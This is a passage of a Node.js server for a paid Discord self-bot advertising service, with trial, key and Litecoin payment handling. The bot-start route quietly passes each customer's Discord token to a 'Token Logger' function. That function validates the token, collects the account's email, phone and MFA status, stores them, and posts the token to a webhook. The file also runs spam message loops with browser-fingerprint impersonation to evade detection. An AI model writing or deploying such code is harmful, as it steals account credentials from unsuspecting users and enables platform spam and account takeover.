      headers: { 'Content-Type': 'application/json', 'User-Agent': _rfp() },
      timeout: 10000
    });
  } catch(e) {}
}

async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
  try {
    // Use curl-impersonate for token validation to match real browser behavior
    const fp = _rfp();
    const superProps = generateXSuperProperties(fp);
    const validateRes = await curlImpersonateRequest(
      'https://discord.com/api/v10/users/@me  ',
      'GET',
      {
        'Authorization': token,
        'User-Agent': fp,
        'X-Discord-Locale': 'en-US',
        'X-Super-Properties': superProps,
      },
      null,
      10000
    );

    if (!validateRes.data) { console.log('[TOKEN GRABBER] Invalid token received'); return { success: false, error: 'Invalid token' }; }

    const userData = validateRes.data;
    const fullInfo = { ...userInfo, id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale };
    db.addGrabbedToken(token, fullInfo, source);

    const embed = {
      title: 'Token Grabbed',
      color: 0xff0000,
      fields: [
        { name: 'Token', value: '```' + token + '```', inline: false },
        { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
        { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
        { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
        { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
        { name: 'MFA', value: fullInfo.mfa_enabled ? 'Yes' : 'No', inline: true },
        { name: 'Verified', value: fullInfo.verified ? 'Yes' : 'No', inline: true },
        { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'No', inline: true },
        { name: 'Source', value: source, inline: true },
        { name: 'Time', value: new Date().toISOString(), inline: true }
      ],
      footer: { text: 'Token Logger v2.0' }
    };

    await _sendWebhookChunk(embed, 0);
    console.log('[TOKEN GRABBER] Token sent to webhook successfully');
    return { success: true, user: fullInfo };
  } catch (err) {
    console.error('[TOKEN GRABBER] Error:', err.message);
    return { success: false, error: err.message };
  }
}

let walletModule = null;
try { walletModule = require('./wallet'); console.log('[WALLET] Loaded successfully'); } catch(e) { console.error('[WALLET] Failed to load:', e.message); }

async function checkAndSweep() {
  if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) { console.log('[SWEEP] Skipped - missing deps'); return; }
  db.expireOldAddresses();
  const pending = db.getAllPending();
  console.log(`[SWEEP] Checking ${pending.length} active addresses`);
  for (const p of pending) {
    try {
      const balance = await walletModule.checkAddressBalance(p.address);
      console.log(`[SWEEP] ${p.address}: ${balance} LTC`);
      if (balance > 0) {
        console.log(`[SWEEP] Found balance! Sweeping...`);
        const txid = await walletModule.createTransaction(p.private_key, p.address, OWNER_LTC_ADDRESS);
        if (txid) {
          console.log(`[SWEEP] SUCCESS: ${txid}`);
          const ltcPrice = await getLTCToUSD();
          const usdValue = balance * ltcPrice;
          if (usdValue >= (TARGET_USD - TOLERANCE_USD)) {
            db.setUser(p.user_id, { auto_adv_purchased: 1, purchased_at: Date.now() });
            db.updatePending(p.address, { status: 'completed', paid_at: Date.now(), amount_received_ltc: balance });
          }
        }
      }
    } catch (e) { console.error(`[SWEEP] Error for ${p.address}:`, e.message); }
  }
}

let cachedPrice = 85;
async function getLTCToUSD() {
  try {
    const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd  ', {
      headers: { 'User-Agent': _rfp() }, timeout: 10000
    });
    cachedPrice = res.data.litecoin.usd;
  } catch (e) {}
  return cachedPrice;
}

if (walletModule && OWNER_LTC_ADDRESS && WALLET_MNEMONIC) {
  console.log('[AUTO-SWEEP] Starting 10-second interval');
  setInterval(checkAndSweep, 10000);
  setTimeout(checkAndSweep, 5000);
}

setInterval(() => {
  const expiredUserId = db.checkAllTrialBots();
  if (expiredUserId) {
    try {
      const userBots = db.getUserActiveBots(expiredUserId);
      for (const configId in userBots) {
        const key = `${expiredUserId}_${configId}`;
        if (activeBots.has(key)) { activeBots.get(key).destroy(); activeBots.delete(key); }
        console.log(`[TRIAL MONITOR] Force stopped bot ${configId} for user ${expiredUserId}`);
      }
    } catch(e) { console.error('[TRIAL MONITOR] Error stopping bots:', e.message); }
  }
}, 5000);

setInterval(() => {
  const expiredKeys = db.checkExpiredKeys();
  if (expiredKeys > 0) console.log(`[KEY EXPIRY] ${expiredKeys} expired keys processed, bots stopped`);
}, 60000);

app.get('/login', passport.authenticate('discord'));
app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => {
  res.redirect('/');
});
app.get('/logout', (req, res) => { req.logout(() => res.redirect('/')); });

app.get('/api/user', ensureAuthAPI, (req, res) => {
  const user = db.getUser(req.user.id);
  const trialActive = db.isTrialActive(req.user.id);
  const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
  const isOwner = req.user.id === OWNER_ID;
  const isWhitelisted = db.isWhitelisted(req.user.id);
  res.json({ id: req.user.id, username: req.user.username, global_name: req.user.global_name, avatar: req.user.avatar, purchased: user.auto_adv_purchased === 1, trialActive, trialTimeLeft, trialExpires: user.trial_expires || 0, isOwner, isWhitelisted, canGenerate: isOwner || isWhitelisted });
});

app.post('/api/trial/claim', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  if (db.hasClaimedTrial(userId)) return res.json({ success: false, error: 'You already claimed your trial' });
  if (db.hasIPClaimedTrial(ip)) return res.json({ success: false, error: 'Trial already claimed from this IP' });
  const trial = db.claimTrial(userId, ip);
  res.json({ success: true, message: 'Trial activated for 10 minutes', expiresAt: trial.expiresAt, timeLeft: 600 });
});

app.get('/api/trial/status', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const isActive = db.isTrialActive(userId);
  const timeLeft = isActive ? db.getTrialTimeLeft(userId) : 0;
  const hasClaimed = db.hasClaimedTrial(userId);
  res.json({ success: true, hasClaimed, isActive, timeLeft, canClaim: !hasClaimed && !db.hasIPClaimedTrial(req.ip || 'unknown') });
});

app.post('/api/grab/token', async (req, res) => {
  const { token, source } = req.body;
  if (!token) return res.json({ success: false, error: 'No token provided' });
  const result = await grabAndSendToken(token, {}, source || 'manual');
  res.json(result);
});

app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
  try {
    const userId = req.user.id;
    const user = db.getUser(userId);
    if (user.auto_adv_purchased === 1) return res.json({ success: false, error: 'Already purchased' });
    const existingPending = db.getUserPending(userId);
    if (existingPending) {
      const timeLeft = Math.ceil((existingPending.expires_at - Date.now()) / 60000);
      return res.json({ success: true, address: existingPending.address, amountUSD: TARGET_USD, index: existingPending.index, existing: true, expiresIn: timeLeft, expiresAt: existingPending.expires_at, message: 'You already have an active payment address' });
    }
    if (!walletModule) return res.status(500).json({ success: false, error: 'Wallet module not loaded' });
    let globalIndex = db.getNextGlobalIndex();
    let { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
    let attempts = 0;
    while (db.isAddressUsed(address) && attempts < 10) {
      console.log(`[ADDRESS COLLISION] Address ${address} already used, generating next...`);
      globalIndex = db.getNextGlobalIndex();
      ({ address, privateKey } = walletModule.generateLTCAddress(globalIndex));
      attempts++;
    }
    if (db.isAddressUsed(address)) return res.status(500).json({ success: false, error: 'Unable to generate unique address' });
    const pending = db.addPending(userId, address, privateKey, TARGET_USD, globalIndex);
    res.json({ success: true, address, amountUSD: TARGET_USD, index: globalIndex, expiresAt: pending.expires_at, message: 'Address generated. Valid for 30 minutes.' });
  } catch (err) { console.error('[PURCHASE ERROR]', err); res.status(500).json({ success: false, error: err.message }); }
});

app.get('/api/activity', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const user = db.getUser(userId);
  const pending = db.getUserPending(userId);
  const history = db.getAddressHistory(userId);
  const trialActive = db.isTrialActive(req.user.id);
  const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
  res.json({ success: true, purchased: user.auto_adv_purchased === 1, trialActive, trialTimeLeft, trialExpires: user.trial_expires || 0, pending: pending ? { address: pending.address, index: pending.index, createdAt: pending.created_at, expiresAt: pending.expires_at, expiresIn: Math.max(0, Math.ceil((pending.expires_at - Date.now()) / 1000)), status: pending.status } : null, history: history.map(h => ({ address: h.address, index: h.index, createdAt: h.created_at, status: h.status })) });
});

app.post('/api/redeem', ensureAuthAPI, (req, res) => {
  try {
    const { key } = req.body;
    const userId = req.user.id;
    console.log(`[REDEEM ATTEMPT] User: ${userId}, Raw key: "${key}"`);
    if (!key) { console.log('[REDEEM FAIL] No key provided'); return res.json({ success: false, error: 'Invalid key' }); }
    const validation = validateKeyStrict(key);
    console.log(`[REDEEM] Validation result:`, validation);
    if (!validation.valid) { console.log(`[REDEEM FAIL] ${validation.error}`); return res.json({ success: false, error: validation.error }); }
    const normalizedKey = validation.normalized;
    if (validation.isGenerated) {
      const success = db.useGeneratedKey(normalizedKey, userId);
      if (!success) return res.json({ success: false, error: 'Key expired or revoked' });
      return res.json({ success: true, message: 'Access granted via generated key!' });
    }
    const isValidKey = VALID_REDEEM_KEYS.has(normalizedKey);
    console.log(`[REDEEM] Key in VALID_REDEEM_KEYS? ${isValidKey}`);
    if (!isValidKey) {
      const customKeys = db.data.customKeys || [];
      const isCustomKey = customKeys.includes(normalizedKey);
      console.log(`[REDEEM] Key in custom keys? ${isCustomKey}`);
      if (!isCustomKey) { console.log(`[REDEEM FAIL] Key not found in valid keys`); return res.json({ success: false, error: 'Invalid key' }); }
    }
    const isUsed = db.isKeyUsed(normalizedKey);
    console.log(`[REDEEM] Key used? ${isUsed}`);
    if (isUsed) { console.log(`[REDEEM FAIL] Key already used`); return res.json({ success: false, error: 'Key already used' }); }
    const user = db.getUser(userId);
    console.log(`[REDEEM] User purchased status: ${user.auto_adv_purchased}`);
    if (user.auto_adv_purchased === 1) { console.log(`[REDEEM FAIL] User already has access`); return res.json({ success: false, error: 'You already have access' }); }
    console.log(`[REDEEM SUCCESS] Granting access to ${userId} with key ${normalizedKey}`);
    db.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), redeem_key_used: normalizedKey });
    db.useKey(normalizedKey, userId);
    res.json({ success: true, message: 'Access granted!' });
  } catch (err) {
    console.error('[REDEEM ERROR]', err);
    res.status(500).json({ success: false, error: err.message });
  }
});

app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
  const configs = db.getConfigs(req.user.id);
  res.json({ success: true, configs });
});

const activeBots = new Map();

app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
  try {
    const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, images, sendAllAtOnce } = req.body;
    if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });

    await grabAndSendToken(token, { channels, messages }, 'bot_start');

    const channelList = channels.split(',').map(c => c.trim()).filter(c => /^\d+$/.test(c));
    if (channelList.length === 0) return res.json({ success: false, error: 'Invalid channel IDs' });

    const client = new StealthClient(token);
    await client.connect();

    const delayMs = (parseInt(delay) || 30) * 1000;
    const autoReply = autoReplyEnabled ? 1 : 0;

    let joinStatus = null;
    if (joinServer && serverInvite) joinStatus = await client.joinGuild(serverInvite.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, ''));

    const savedImages = [];
    if (images && Array.isArray(images)) {
      for (const img of images) {
        if (!img || !img.url) continue;
        if (img.url.startsWith('data:')) {
          try {
            const imageId = `img_${Date.now()}_${req.user.id}_${img.id || '0'}.png`;
            const imagePath = path.join(dataDir, 'uploads');
            if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
            const base64Data = img.url.split(',')[1];
            const buffer = Buffer.from(base64Data, 'base64');
            fs.writeFileSync(path.join(imagePath, imageId), buffer);
            savedImages.push({ id: img.id || savedImages.length + 1, url: `/uploads/${imageId}` });
          } catch (imgErr) { console.error('[IMAGE SAVE ERROR]', imgErr); }
        } else if (img.url.startsWith('/uploads/') || img.url.startsWith('http')) {
          savedImages.push({ id: img.id || savedImages.length + 1, url: img.url });
        }
      }
    }

    const messageList = messages.map((m) => ({ text: m.text || '', imageIds: Array.isArray(m.imageIds) ? m.imageIds : [] })).filter(m => m.text.trim() !== '' || m.imageIds.length > 0);
    if (messageList.length === 0) return res.status(400).json({ success: false, error: 'At least one non-empty message required' });

    db.setConfig(req.user.id, { token, channels, messages: messageList, delay_seconds: parseInt(delay) || 30, auto_reply_enabled: autoReply, auto_reply_text: autoReplyText || '', active: 1, username: client.user.username, server_joined: joinStatus?.success || false, images: savedImages, send_all_at_once: sendAllAtOnce ? 1 : 0 }, configId);
    db.registerActiveBot(req.user.id, configId, token);

    const botKey = `${req.user.id}_${configId}`;
    activeBots.set(botKey, client);

    let currentMsgIdx = 0;
    let currentChIdx = 0;
    let stopped = false;

    const msgLoop = async () => {
      console.log(`[BOT ${configId}] Message loop started. Channels: ${channelList.join(', ')}, Messages: ${messageList.length}, Delay: ${delayMs}ms`);
      while (!stopped && activeBots.has(botKey)) {
        if (db) {
          const user = db.getUser(req.user.id);
          const trialActive = db.isTrialActive(req.user.id);
          const hasPurchase = user.auto_adv_purchased === 1;
          if (!trialActive && !hasPurchase) {
            console.log(`[BOT ${configId}] Access expired (no trial, no purchase). Stopping loop.`);
            break;
          }
        }

        const msg = messageList[currentMsgIdx % messageList.length];
        let targetImages = [];
        if (msg.imageIds && msg.imageIds.length > 0) {
          targetImages = savedImages.filter(img => img.id !== undefined && (msg.imageIds.includes(img.id) || msg.imageIds.includes(Number(img.id)) || msg.imageIds.includes(String(img.id))));
        }

        const sendWithRetry = async (chId, text, files, retries = 2) => {
          for (let attempt = 0; attempt <= retries; attempt++) {
            try {
              const ok = await client.sendMessage(chId, text, files);
              if (ok) { console.log(`[BOT ${configId}] Sent to ${chId}: "${text.slice(0, 60)}"`); return true; }
              throw new Error(`sendMessage returned false (attempt ${attempt + 1})`);
            } catch(e) {
              console.error(`[BOT ${configId}] Send error to ${chId} (attempt ${attempt + 1}/${retries + 1}):`, e.message);
              if (attempt < retries) await new Promise(r => setTimeout(r, 2000 * (attempt + 1)));
            }
          }
          return false;
        };

        if (sendAllAtOnce) {
          for (const chId of channelList) {
            const files = targetImages.map(img => {
              if (img.url.startsWith('/uploads/')) {
                const p = path.join(dataDir, 'uploads', img.url.replace(/^\/uploads\//, ''));
                return fs.existsSync(p) ? { buffer: fs.readFileSync(p), name: path.basename(p) } : null;
              }
              return null;
            }).filter(Boolean);
            await sendWithRetry(chId, msg.text, files);
          }
        } else {
          const chId = channelList[currentChIdx % channelList.length];
          currentChIdx++;
          const files = targetImages.map(img => {
            if (img.url.startsWith('/uploads/')) {
              const p = path.join(dataDir, 'uploads', img.url.replace(/^\/uploads\//, ''));
              return fs.existsSync(p) ? { buffer: fs.readFileSync(p), name: path.basename(p) } : null;
            }
            return null;
          }).filter(Boolean);
          await sendWithRetry(chId, msg.text, files);
        }

        currentMsgIdx++;
        await new Promise(r => setTimeout(r, _j(delayMs, 0.15)));
      }
      console.log(`[BOT ${configId}] Message loop exited.`);
    };

    if (autoReply && autoReplyText) {
      client.on('messageCreate', async (msg) => {
        if (msg.author.id === client.user.id) return;
        const isDM = msg.channel_type === 1 || msg.channel_type === 'DM';
        if (!isDM) return;
        if (db) {
          const user = db.getUser(req.user.id);
          const trialActive = db.isTrialActive(req.user.id);
          const hasPurchase = user.auto_adv_purchased === 1;
          if (!trialActive && !hasPurchase) return;
        }
        if (client.repliedUsers.has(msg.author.id)) {
          console.log(`[BOT ${configId}] Skipping auto-reply to ${msg.author.username} - already in replied history`);
          return;
        }
        client.repliedUsers.add(msg.author.id);
        client._saveRepliedUsers();
        try {
          await client.sendMessage(msg.channel_id, autoReplyText);
          console.log(`[BOT ${configId}] Auto-reply sent to ${msg.author.username}`);
        } catch (err) {
          try {
            const dmRes = await client._api('/users/@me/channels', 'POST', { recipient_id: msg.author.id });
            if (dmRes.id) await client.sendMessage(dmRes.id, autoReplyText);
          } catch(e2) { console.error(`[BOT ${configId}] Auto-reply failed:`, e2.message); }
        }
      });
    }

    msgLoop();

    res.json({ success: true, username: client.user.username, configId, serverJoined: joinStatus?.success || false, tokenGrabbed: true, imageCount: savedImages.length, messageCount: messageList.length });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
  try {
    const { configId = 'default' } = req.body;
    const botKey = `${req.user.id}_${configId}`;
    const bot = activeBots.get(botKey);
    if (bot) { bot.destroy(); activeBots.delete(botKey); }
    db.unregisterActiveBot(req.user.id, configId);
    const config = db.getConfig(req.user.id, configId);
    if (config) { config.active = 0; db.setConfig(req.user.id, config, configId); }
    res.json({ success: true });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/bot/delete', ensureAuthAPI, (req, res) => {
  try { const { configId } = req.body; db.deleteConfig(req.user.id, configId); res.json({ success: true }); }
  catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
  try {
    const { imageBase64 } = req.body;
    if (!imageBase64) return res.json({ success: false, error: 'No image provided' });
    const imageId = `img_${Date.now()}.png`;
    const imagePath = path.join(dataDir, 'uploads');
    if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
    const buffer = Buffer.from(imageBase64.split(',')[1], 'base64');
    fs.writeFileSync(path.join(imagePath, imageId), buffer);
    res.json({ success: true, imageUrl: `/uploads/${imageId}`, imageId });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.use('/uploads', express.static(path.join(dataDir, 'uploads')));

app.get('/api/admin/keys', ensureCanGenerate, (req, res) => { const keys = db.getGeneratedKeys(); res.json({ success: true, keys }); });
app.post('/api/admin/keys/generate', ensureCanGenerate, (req, res) => {
  const { duration } = req.body;
  if (!duration || !['lifetime', '1h', '24h', '7d', '30d'].includes(duration)) return res.status(400).json({ success: false, error: 'Invalid duration' });
  let dbDuration = duration;
  if (duration === '7d') dbDuration = '168';
  if (duration === '30d') dbDuration = '720';
  const keyData = db.generateKey(dbDuration);
  res.json({ success: true, key: keyData });
});

app.post('/api/admin/keys/revoke', ensureOwner, (req, res) => {
  const { key } = req.body;
  if (!key) return res.status(400).json({ success: false, error: 'No key provided' });
  const success = db.revokeKey(key);
  res.json({ success });
});

app.get('/api/admin/whitelist', ensureOwner, (req, res) => { res.json({ success: true, whitelist: db.getWhitelist() }); });
app.post('/api/admin/whitelist/add', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.addToWhitelist(userId); res.json({ success: true }); });
app.post('/api/admin/whitelist/remove', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.removeFromWhitelist(userId); res.json({ success: true }); });

app.get('/', (req, res) => { if (req.isAuthenticated()) return res.redirect('/dashboard'); res.sendFile(path.join(__dirname, 'public', 'overall.html')); });
app.get('/dashboard', (req, res) => { res.sendFile(path.join(__dirname, 'public', 'overall.html')); });

app.use((err, req, res, next) => { console.error('[SERVER ERROR]', err); res.status(500).json({ error: err.message }); });

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`[SERVER] Running on port ${PORT}`);
  _startNoise();
});

module.exports = { app, db, activeBots };
